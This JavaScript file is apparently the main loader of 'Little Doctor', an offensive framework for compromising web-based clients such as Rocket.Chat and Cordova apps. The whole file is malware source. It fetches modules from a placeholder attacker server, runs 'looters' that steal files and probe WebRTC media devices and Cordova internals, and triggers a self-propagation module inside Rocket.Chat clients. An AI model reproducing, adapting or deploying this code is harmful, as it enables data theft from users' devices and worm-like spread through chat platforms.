/*
 * --- THE LITTLE DOCTOR  --- 
 * 
 * Authors: Moloch, Shubs, and Mandatory
 * 
 * The Molecular Disruption Device, also known as the Molecular Detachment Device, M.D. Device, Doctor Device, 
 * or Little Doctor as a play on the acronym, was a powerful weapon designed and built by the International Fleet.
 * 
 * The Molecular Disruption Device utilized two beams, which when fired would meet together to create a field in which
 * electrons could not be shared. The field would spread out in a sphere, but would become weaker the longer it dispersed.
 * If the field came into contact with more molecules, it became more powerful and the dispersal process would start over.
 * After the field died down, the only thing remaining would be a clump of iron molecules.
 * 
 */


var __ld_scheme = '__LITTLE_DOCTOR_SCHEME__://';
var __ld_hostname = '__LITTLE_DOCTOR_HOSTNAME__:__LITTLE_DOCTOR_LISTEN_PORT__';
var __ld_server = __ld_scheme + __ld_hostname;

requirejs.config({

    paths: {
        filesystem: __ld_server + '/modules/filesystem',
        utils: __ld_server + '/modules/utils',
        platform: __ld_server + '/modules/platform',
        msr: __ld_server + '/modules/dependencies/msr',

        // Loot modules
        lootFiles: __ld_server + '/modules/looters/files',
        lootWebRtc: __ld_server + '/modules/looters/webrtc',
        lootCordova: __ld_server + '/modules/looters/cordova',

        // Propagation modules
        propagateRocketChat: __ld_server + '/modules/propagation/rocketchat',

    }

});


// Main entry point for little doctor
function __ld_main() {

    console.log('Little Doctor is examining the patient ...');
            
    // FileSystem Looter
    requirejs(['filesystem', 'platform'], function(fs, platform) {
        fs.isFileSystemAccessbile({
            success: function() {
                console.log('FileSystem appears to be accessible, loading looter ...');
                requirejs(['lootFiles'], function(lootFiles) {
                    lootFiles.execute();
                });
            },
            failure: function() {
                console.log('FileSystem does not appear to be accessible');
            }
        });
    });

    // RocketChat Propagation
    if (navigator.userAgent.indexOf("Rocket.Chat") > -1) {
        console.log('Appears we are executing inside a rocketchat client');
        requirejs(['propagateRocketChat'], function(rocketchat) {
            console.log('Loaded RocketChat propagation module');
            rocketchat.propagate();
        });
    }

    // WebRTC Looter
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        console.log('WebRTC looks to be accessible');
        requirejs(['lootWebRtc'], function(webrtc) {
            webrtc.execute();
        });
    }

    // Cordova Looter
    if (navigator.device && navigator.device.cordova) {
        console.log('Appears we are inside a Cordova container');
        requirejs(['lootCordova'], function(cordova) {
            cordova.execute();
        });
    }

}

// Ensure the little doctor only runs once
if (!window.LITTLE_DOCTOR) {
    window.LITTLE_DOCTOR = true;
    requirejs(['utils'], function(utils) {
        utils.GET('/login', {
            success: __ld_main,
            failure: function() {
                console.error('Failed to login to server');
            }
        });
    });
}